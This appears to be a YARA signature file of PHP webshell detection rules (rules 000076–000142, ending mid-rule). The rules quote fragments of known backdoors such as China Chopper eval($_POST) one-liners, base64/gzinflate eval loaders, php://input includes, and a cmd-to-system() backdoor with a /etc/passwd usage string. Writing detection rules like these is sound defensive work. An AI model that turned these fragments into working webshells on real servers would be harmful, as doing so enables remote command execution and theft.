rule Backdoor_Webshell_PHP_000076
{
    meta:
        description = "laudanum injector tools killnc.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-22"
        
    strings:
        $s1 = "if ($_SERVER[\"REMOTE_ADDR\"] == $IP)" fullword ascii /* PEStudio Blacklist: strings */
        $s2 = "header(\"HTTP/1.0 404 Not Found\");" fullword ascii
        $s3 = "<?php echo exec('killall nc');?>" fullword ascii /* PEStudio Blacklist: strings */
        $s4 = "<title>Laudanum Kill nc</title>" fullword ascii /* PEStudio Blacklist: strings */
        $s5 = "foreach ($allowedIPs as $IP) {" fullword ascii
        
    condition:
        filesize < 15KB and 4 of them
}
rule Backdoor_Webshell_PHP_000077
{
    meta:
        description = "laudanum injector tools settings.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-22"
        
    strings:
        $s1 = "Port: <input name=\"port\" type=\"text\" value=\"8888\">" fullword ascii /* PEStudio Blacklist: strings */
        $s2 = "<li>Reverse Shell - " fullword ascii /* PEStudio Blacklist: strings */
        $s3 = "<li><a href=\"<?php echo plugins_url('file.php', __FILE__);?>\">File Browser</a>" ascii /* PEStudio Blacklist: strings */
        
    condition:
        filesize < 13KB and all of them
}
rule Backdoor_Webshell_PHP_000078
{
    meta:
        description = "users_list.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-13"
        
    strings:
        $s0 = "<a href=\"users_create.php\">Create User</a>" fullword ascii
        $s7 = "$skiplist = array('##MS_AgentSigningCertificate##','NT AUTHORITY\\NETWORK SERVIC" ascii
        $s11 = "&nbsp;<b>Default DB</b>&nbsp;" fullword ascii
        
    condition:
        filesize < 12KB and all of them
}
rule Backdoor_Webshell_PHP_000079
{
    meta:
        description = "trigger_modify.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-13"
        
    strings:
        $s1 = "<form name=\"form1\" method=\"post\" action=\"trigger_modify.php?trigger=<?php e" ascii
        $s2 = "$data_query = @mssql_query('sp_helptext \\'' . urldecode($_GET['trigger']) . '" ascii
        $s3 = "if($_POST['query'] != '')" fullword ascii
        $s4 = "$lines[] = 'I am unable to read this trigger.';" fullword ascii
        $s5 = "<b>Modify Trigger</b>" fullword ascii
        
    condition:
        filesize < 15KB and all of them
}
rule Backdoor_Webshell_PHP_000080
{
    meta:
        description = "oracle_data.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-13"
        
    strings:
        $s0 = "$txt=fopen(\"oracle_info.txt\",\"w\");" fullword ascii
        $s1 = "if(isset($_REQUEST['id']))" fullword ascii
        $s2 = "$id=$_REQUEST['id'];" fullword ascii
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000081
{
    meta:
        description = "item-old.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-13"
        
    strings:
        $s1 = "$sCmd = \"wget -qc \".escapeshellarg($sURL).\" -O \".$sFile;" fullword ascii
        $s2 = "$sCmd = \"convert \".$sFile.\" -flip -quality 80 \".$sFileOut;" fullword ascii
        $s3 = "$sHash = md5($sURL);" fullword ascii
        
    condition:
        filesize < 7KB and 2 of them
}
rule Backdoor_Webshell_PHP_000082
{
    meta:
        description = "reduh.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-13"
        
    strings:
        $s1 = "errorlog(\"FRONTEND: send_command '\".$data.\"' on port \".$port.\" returned \"." ascii
        $s2 = "$msg = \"newData:\".$socketNumber.\":\".$targetHost.\":\".$targetPort.\":\".$seq" ascii
        $s3 = "errorlog(\"BACKEND: *** Socket key is \".$sockkey);" fullword ascii
        
    condition:
        filesize < 57KB and all of them
}
rule Backdoor_Webshell_PHP_000083
{
    meta:
        description = "old.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-13"
        
    strings:
        $s0 = "$sCmd = \"wget -qc \".escapeshellarg($sURL).\" -O \".$sFile;" fullword ascii
        $s1 = "$sURL = \"http://\".$sServer.\"/\".$sFile;" fullword ascii
        $s2 = "chmod(\"/\".substr($sHash, 0, 2), 0777);" fullword ascii
        $s3 = "$sCmd = \"echo 123> \".$sFileOut;" fullword ascii
        
    condition:
        filesize < 6KB and all of them
}
rule Backdoor_Webshell_PHP_000084
{
    meta:
        description = "item-301.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-13"
        
    strings:
        $s1 = "$sURL = \"301:http://\".$sServer.\"/index.asp\";" fullword ascii
        $s2 = "(gov)\\\\.(cn)$/i\", $aURL[\"host\"])" ascii
        $s3 = "$aArg = explode(\" \", $sContent, 5);" fullword ascii
        $s4 = "$sURL = $aArg[0];" fullword ascii
        
    condition:
        filesize < 3KB and 3 of them
}
rule Backdoor_Webshell_PHP_000085
{
    meta:
        description = "item.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-13"
        
    strings:
        $s1 = "$sURL = \"http://\".$sServer.\"/\".$sWget;" fullword ascii
        $s2 = "$sURL = \"301:http://\".$sServer.\"/\".$sWget;" fullword ascii
        $s3 = "$sWget=\"index.asp\";" fullword ascii
        $s4 = "$aURL += array(\"scheme\" => \"\", \"host\" => \"\", \"path\" => \"\");" fullword ascii
        
    condition:
        filesize < 4KB and all of them
}
rule Backdoor_Webshell_PHP_000086
{
    meta:
        description = "chopper temp.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-13"
        
    strings:
        $s0 = "@eval($_POST[strtoupper(md5(gmdate(" ascii
        
    condition:
        filesize < 150 and all of them
}
rule Backdoor_Webshell_PHP_000087
{
    meta:
        description = "templatr.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-13"
        
    strings:
        $s0 = "eval(gzinflate(base64_decode('" ascii
        
    condition:
        filesize < 70KB and all of them
}
rule Backdoor_Webshell_PHP_000088
{
    meta:
        description = "php.txt"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-14"
        
    strings:
        $s1 = "$Config=$_SERVER['QUERY_STRING'];" fullword ascii
        $s2 = "gzuncompress($_SESSION['api']),null);" ascii
        $s3 = "sprintf('%s?%s',pack(\"H*\"," ascii
        $s4 = "if(empty($_SESSION['api']))" fullword ascii
        
    condition:
        filesize < 1KB and all of them
}
rule Backdoor_Webshell_PHP_000089
{
    meta:
        description = "php.html"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2015-06-14"
        
    strings:
        $s1 = "function connect($dbhost, $dbuser, $dbpass, $dbname='') {" fullword ascii
        $s2 = "scookie('loginpass', '', -86400 * 365);" fullword ascii
        $s3 = "<title><?php echo $act.' - '.$_SERVER['HTTP_HOST'];?></title>" fullword ascii
        $s4 = "Powered by <a title=\"Build 20130112\" href=\"http://www.4ngel.net\" target=\"_b" ascii
        $s5 = "formhead(array('title'=>'Execute Command', 'onsubmit'=>'g(\\'shell\\',null,this." ascii
        $s6 = "secparam('IP Configurate',execute('ipconfig -all'));" fullword ascii
        $s7 = "secparam('Hosts', @file_get_contents('/etc/hosts'));" fullword ascii
        $s8 = "p('<p><a href=\"http://w'.'ww.4'.'ng'.'el.net/php'.'sp'.'y/pl'.'ugin/\" target=" ascii
        
    condition:
        filesize < 100KB and 4 of them
}
rule Backdoor_Webshell_PHP_000090
{
    meta:
        description = "weevely webshell heavily scrambled tiny"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-12-14"
        
    strings:
        $php = "<?php" ascii
        $s0 = /\$[a-z]{4} = \$[a-z]{4}\("[a-z][a-z]?",[\s]?"",[\s]?"/ ascii
        $s1 = /\$[a-z]{4} = str_replace\("[a-z][a-z]?","","/ ascii
        $s2 = /\$[a-z]{4}\.\$[a-z]{4}\.\$[a-z]{4}\.\$[a-z]{4}\)\)\); \$[a-z]{4}\(\);/ ascii
        $s4 = /\$[a-z]{4}="[a-zA-Z0-9]{70}/ ascii
        
    condition:
        $php at 0 and all of ($s*) and filesize > 570 and filesize < 800
}
rule Backdoor_Webshell_PHP_000091
{
    meta:
        description = "h4ntu shell powered_by_tsoi.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s0 = "  <TD><DIV STYLE=\"font-family: verdana; font-size: 10px;\"><b>Server Adress:</b"
        $s3 = "  <TD><DIV STYLE=\"font-family: verdana; font-size: 10px;\"><b>User Info:</b> ui"
        $s4 = "    <TD><DIV STYLE=\"font-family: verdana; font-size: 10px;\"><?= $info ?>: <?= "
        $s5 = "<INPUT TYPE=\"text\" NAME=\"cmd\" value=\"<?php echo stripslashes(htmlentities($"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000092
{
    meta:
        description = "mysql sql.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s0 = "$result=mysql_list_tables($db) or die (\"$h_error<b>\".mysql_error().\"</b>$f_"
        $s4 = "print \"<a href=\\\"$_SERVER[PHP_SELF]?s=$s&login=$login&passwd=$passwd&"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000093
{
    meta:
        description = "a.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s1 = "echo \"<option value=\\\"\". strrev(substr(strstr(strrev($work_dir), \"/\""
        $s2 = "echo \"<option value=\\\"$work_dir\\\" selected>Current Directory</option>"
        $s4 = "<input name=\"submit_btn\" type=\"submit\" value=\"Execute Command\"></p> "
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000094
{
    meta:
        description = "imhapftp.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s8 = "if ($l) echo '<a href=\"' . $self . '?action=permission&amp;file=' . urlencode($"
        $s9 = "return base64_decode('R0lGODlhEQANAJEDAMwAAP///5mZmf///yH5BAHoAwMALAAAAAARAA0AAA"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000095
{
    meta:
        description = "safe mode bypass php 4.4.2 and php 5.1.2.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $a0 = "die(\"\\nWelcome.. By This script you can jump in the (Safe Mode=ON) .. Enjoy\\n"
        $a1 = "Mode Shell v1.0</font></span></a></font><font face=\"Webdings\" size=\"6\" color"
        $a2 = "Welcome.. By This script you can jump in the (Safe Mode=ON) .. Enjoy"
        $a3 = "Mode Shell v1.0</font></span>"
        $a4 = "has been already loaded. PHP Emperor <xb5@hotmail."
        
        $b0 = "<option value=\"/etc/passwd\">Get /etc/passwd</option>"
        $b1 = "by PHP Emperor<xb5@hotmail.com>"
        $b2 = "\".htmlspecialchars($file).\" has been already loaded. PHP Emperor <xb5@hotmail."
        $b3 = "die(\"<FONT COLOR=\\\"RED\\\"><CENTER>Sorry... File"
        $b4 = "if(empty($_GET['file'])){"
        $b5 = "echo \"<head><title>Safe Mode Shell</title></head>\"; "
        
    condition:
        1 of ($a*) or 3 of ($b*)
}
rule Backdoor_Webshell_PHP_000096
{
    meta:
        description = "simattacker vrsion 1.0.0 priv8.4 my_friend.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s2 = "echo \"<a href='?id=fm&fchmod=$dir$file'><span style='text-decoration: none'><fo"
        $s3 = "fputs ($fp ,\"\\n*********************************************\\nWelcome T0 Sim"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000097
{
    meta:
        description = "pwhash"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s1 = "<tt>&nbsp;</tt>\" (space), \"<tt>[</tt>\" (left bracket), \"<tt>|</tt>\" (pi"
        $s3 = "word: \"<tt>null</tt>\", \"<tt>yes</tt>\", \"<tt>no</tt>\", \"<tt>true</tt>\","
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000098
{
    meta:
        description = "phpremoteview.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s2 = "<input type=submit value='\".mm(\"Delete all dir/files recursive\").\" (rm -fr)'"
        $s4 = "<a href='$self?c=delete&c2=$c2&confirm=delete&d=\".urlencode($d).\"&f=\".u"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000099
{
    meta:
        description = "caidao guo.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s0 = "<?php ($www= $_POST['ice'])!"
        $s1 = "@preg_replace('/ad/e','@'.str_rot13('riny').'($ww"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000100
{
    meta:
        description = "redcod.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s0 = "H8p0bGFOEy7eAly4h4E4o88LTSVHoAglJ2KLQhUw"
        $s1 = "HKP7dVyCf8cgnWFy8ocjrP5ffzkn9ODroM0/raHm"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000101
{
    meta:
        description = "remview_fix.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s4 = "<a href='$self?c=delete&c2=$c2&confirm=delete&d=\".urlencode($d).\"&f=\".u"
        $s5 = "echo \"<P><hr size=1 noshade>\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000102
{
    meta:
        description = "server.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s0 = "eval(getenv('HTTP_CODE'));"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000103
{
    meta:
        description = "ph_vayv.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s0 = "style=\"BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px in"
        $s4 = "<font color=\"#858585\">SHOPEN</font></a></font><font face=\"Verdana\" style"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000104
{
    meta:
        description = "mysql cihshell_fix.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s7 = "<tr style='background:#242424;' ><td style='padding:10px;'><form action='' encty"
        $s8 = "if (isset($_POST['mysqlw_host'])){$dbhost = $_POST['mysqlw_host'];} else {$dbhos"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000105
{
    meta:
        description = "private_i3lue.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s8 = "case 15: $image .= \"\\21\\0\\"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000106
{
    meta:
        description = "file upload up.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s0 = "copy($HTTP_POST_FILES['userfile']['tmp_name'], $_POST['remotefile']);"
        $s3 = "if(is_uploaded_file($HTTP_POST_FILES['userfile']['tmp_name'])) {"
        $s8 = "echo \"Uploaded file: \" . $HTTP_POST_FILES['userfile']['name'];"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000107
{
    meta:
        description = "mysql interface v1.0.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s0 = "echo \"<td><a href='$PHP_SELF?action=dropDB&dbname=$dbname' onClick=\\\"return"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000108
{
    meta:
        description = "s_u.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s6 = "<a href=\"?act=do\"><font color=\"red\">Go Execute</font></a></b><br /><textarea"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000109
{
    meta:
        description = "config.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s1 = "; (choose good passwords!).  Add uses as simple 'username = \"password\"' lines."
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000110
{
    meta:
        description = "network filemanagerphp.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s9 = "  echo \"<br><center>All the data in these tables:<br> \".$tblsv.\" were putted "
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000111
{
    meta:
        description = "caidao ice.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s0 = "<?php ${${eval($_POST[ice])}};?>"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000112
{
    meta:
        description = "phpspy2010.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s3 = "eval(gzinflate(base64_decode("
        $s5 = "//angel"
        $s8 = "$admin['cookiedomain'] = '';"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000113
{
    meta:
        description = "phpshell3.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s2 = "<input name=\"nounce\" type=\"hidden\" value=\"<?php echo $_SESSION['nounce'];"
        $s5 = "<p>Username: <input name=\"username\" type=\"text\" value=\"<?php echo $userna"
        $s7 = "$_SESSION['output'] .= \"cd: could not change to: $new_dir\\n\";"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000114
{
    meta:
        description = "cnseay02_1.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s0 = "(93).$_uU(41).$_uU(59);$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000115
{
    meta:
        description = "fbi.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s7 = "erde types','Getallen','Datum en tijd','Tekst','Binaire gegevens','Netwerk','Geo"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000116
{
    meta:
        description = "b374k.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s0 = "Http://code.google.com/p/b374k-shell"
        $s1 = "$_=str_rot13('tm'.'vas'.'yngr');$_=str_rot13(strrev('rqb'.'prq'.'_'.'46r'.'fno'"
        $s3 = "Jayalah Indonesiaku & Lyke @ 2013"
        $s4 = "B374k Vip In Beautify Just For Self"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000117
{
    meta:
        description = "dodo zip.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s0 = "$hexdtime = '\\x' . $dtime[6] . $dtime[7] . '\\x' . $dtime[4] . $dtime[5] . '\\x"
        $s3 = "$datastr = \"\\x50\\x4b\\x03\\x04\\x0a\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000118
{
    meta:
        description = "azrailphp_v1.0.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s5 = "echo \" <font color='#0000FF'>CHMODU \".substr(base_convert(@fileperms($"
        $s7 = "echo \"<a href='./$this_file?op=efp&fname=$path/$file&dismi=$file&yol=$path'><fo"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000119
{
    meta:
        description = "filelist.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s1 = "// list.php = Directory & File Listing"
        $s2 = "    echo \"( ) <a href=?file=\" . $fichero . \"/\" . $filename . \">\" . $filena"
        $s9 = "// by: The Dark Raver"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000120
{
    meta:
        description = "ironshell.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s4 = "print \"<form action=\\\"\".$me.\"?p=cmd&dir=\".realpath('.').\""
        $s8 = "print \"<td id=f><a href=\\\"?p=rename&file=\".realpath($file).\"&di"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000121
{
    meta:
        description = "caidao 404.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s0 = "<?php $K=sTr_RepLaCe('`','','a`s`s`e`r`t');$M=$_POST[ice];IF($M==NuLl)HeaDeR('St"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000122
{
    meta:
        description = "mysqlwebsh.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s3 = " <TR><TD bgcolor=\"<? echo (!$CONNECT && $action == \"chparam\")?\"#660000\":\"#"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000123
{
    meta:
        description = "dx.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s1 = "print \"\\n\".'Tip: to view the file \"as is\" - open the page in <a href=\"'.Dx"
        $s9 = "class=linelisting><nobr>POST (php eval)</td><"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000124
{
    meta:
        description = "mysql_web_interface_version_0.8.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s0 = "href='$PHP_SELF?action=dumpTable&dbname=$dbname&tablename=$tablename'>Dump</a>"
        
        $a0 = "SooMin Kim"
        $a1 = "http://popeye.snu.ac.kr/~smkim/mysql"
        $a2 = "href='$PHP_SELF?action=dropField&dbname=$dbname&tablename=$tablename"
        $a3 = "<th>Type</th><th>&nbspM&nbsp</th><th>&nbspD&nbsp</th><th>unsigned</th><th>zerofi"
        
    condition:
        all of ($s*) or 2 of ($a*)
}
rule Backdoor_Webshell_PHP_000125
{
    meta:
        description = "odd.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s0 = "include('php://input');"
        $s1 = "// No eval() calls, no system() calls, nothing normally seen as malicious."
        $s2 = "ini_set('allow_url_include, 1'); // Allow url inclusion in this script"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000126
{
    meta:
        description = "idc.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s1 = "if (md5($_GET['usr'])==$user && md5($_GET['pass'])==$pass)"
        $s3 = "{eval($_GET['idc']);}"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000127
{
    meta:
        description = "cpg_143_incl_xpl.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s3 = "$data=\"username=\".urlencode($USER).\"&password=\".urlencode($PA"
        $s5 = "fputs($sun_tzu,\"<?php echo \\\"Hi Master!\\\";ini_set(\\\"max_execution_time"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000128
{
    meta:
        description = "404.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s0 = "$pass = md5(md5(md5($pass)));"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000129
{
    meta:
        description = "webshell-cnseay-x.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s9 = "$_F_F.='_'.$_P_P[5].$_P_P[20].$_P_P[13].$_P_P[2].$_P_P[19].$_P_P[8].$_P_"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000130
{
    meta:
        description = "phpkit_0_1a odd.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s1 = "include('php://input');"
        $s3 = "ini_set('allow_url_include, 1'); // Allow url inclusion in this script"
        $s4 = "// uses include('php://input') to execute arbritary code"
        $s5 = "// php://input based backdoor"
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000131
{
    meta:
        description = "shell.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s4 = "&nbsp;&nbsp;<?php echo buildUrl(\"<font color=\\\"navy\\\">["
        $s6 = "echo \"</form><form action=\\\"$SFileName?$urlAdd\\\" method=\\\"post\\\"><input"
        $s9 = "if  ( ( (isset($http_auth_user) ) && (isset($http_auth_pass)) ) && ( !isset("
        
    condition:
        2 of them
}
rule Backdoor_Webshell_PHP_000132
{
    meta:
        description = "g00nv13.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s1 = "case \"zip\": case \"tar\": case \"rar\": case \"gz\": case \"cab\": cas"
        $s4 = "if(!($sqlcon = @mysql_connect($_SESSION['sql_host'] . ':' . $_SESSION['sql_p"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000133
{
    meta:
        description = "h6ss.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s0 = "<?php eval(gzuncompress(base64_decode(\""
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000134
{
    meta:
        description = "ani-shell.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s0 = "$Python_CODE = \"I"
        $s6 = "$passwordPrompt = \"\\n================================================="
        $s7 = "fputs ($sockfd ,\"\\n==============================================="
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000135
{
    meta:
        description = "worse linux shell.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s0 = "system(\"mv \".$_FILES['_upl']['tmp_name'].\" \".$currentWD"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000136
{
    meta:
        description = "zacosmall.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s0 = "if($cmd!==''){ echo('<strong>'.htmlspecialchars($cmd).\"</strong><hr>"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000137
{
    meta:
        description = "g5.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s3 = "echo \"Hacking Mode?<br><select name='htype'><option >--------SELECT--------</op"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000138
{
    meta:
        description = "r57142.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s0 = "$downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000139
{
    meta:
        description = "C99madShell smowu.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s2 = "<tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Enter ::</b><for"
        $s8 = "<p><font color=red>Wordpress Not Found! <input type=text id=\"wp_pat\"><input ty"
        
    condition:
        1 of them
}
rule Backdoor_Webshell_PHP_000140
{
    meta:
        description = "simple-backdoor.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $a0 = "$cmd = ($_REQUEST['cmd']);"
        $a1 = "if(isset($_REQUEST['cmd'])){"
        $a3 = "system($cmd);"
        
        $b0 = "$cmd = ($_REQUEST['cmd']);"
        $b1 = "<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->"
        $b2 = "Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd"
        
        $c0 = "<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->"
        $c1 = "<!--    http://michaeldaw.org   2006    -->"
        $c2 = "Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd"
        $c3 = "        echo \"</pre>\";"
        $c4 = "        $cmd = ($_REQUEST['cmd']);"
        $c5 = "        echo \"<pre>\";"
        $c6 = "if(isset($_REQUEST['cmd'])){"
        $c7 = "        die;"
        $c8 = "        system($cmd);"
        
    condition:
        2 of ($a*) or 2 of ($b*) or all of ($c*)
}
rule Backdoor_Webshell_PHP_000141
{
    meta:
        description = "404.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s4 = "<span>Posix_getpwuid (\"Read\" /etc/passwd)"
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000142
{
    meta:
        description = "macker's private phpshell.php"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2014-01-28"
        
    strings:
        $s3 = "echo \"<tr><td class=\\\"silver border\\\">&nbsp;<strong>Server's PHP Version:&n"
        $s4 = "&nbsp;&nbsp;<?php echo buildUrl(\"<font color=\\\"navy\\\">["
        $s7 = "echo \"<form action=\\\"$SFileName?$urlAdd\\\" method=\\\"POST\\\"><input type="
        
    condition:
        all of them
}
rule Backdoor_Webshell_PHP_000143
{
    meta:
